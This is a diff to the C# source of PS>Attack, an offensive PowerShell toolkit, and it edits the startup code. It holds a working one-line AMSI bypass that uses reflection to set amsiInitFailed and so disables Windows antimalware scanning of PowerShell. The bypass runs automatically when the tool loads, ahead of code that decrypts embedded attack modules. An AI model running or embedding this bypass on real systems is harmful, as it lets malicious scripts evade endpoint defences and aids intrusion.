@@ -22,16 +22,20 @@ namespace PSAttack
             Console.WriteLine(Strings.psaLogos[pspLogoInt]);
             Console.WriteLine("PS>Attack is loading...");
 
+            // Get Encrypted Values
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            //MemoryStream ms = CryptoUtils.DecryptFile(assembly.GetManifestResourceStream(Properties.Settings.Default.valueStore));
+
             // create attackState
             AttackState attackState = new AttackState();
             attackState.cursorPos = attackState.promptLength;
 
-            // AMSI bypass care of @mattifestion (https://twitter.com/mattifestation/status/735261120487772160)
+            // amsi bypass (thanks matt!)
             if (Environment.OSVersion.Version.Major > 9)
             {
                 try
                 {
-                    attackState.cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
+                    attackState.cmd = "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)";
                     Processing.PSExec(attackState);
                 }
                 catch
@@ -41,7 +45,7 @@ namespace PSAttack
             }
 
             // Decrypt modules
-            Assembly assembly = Assembly.GetExecutingAssembly();
+            
             string[] resources = assembly.GetManifestResourceNames();
             foreach (string resource in resources)
             {
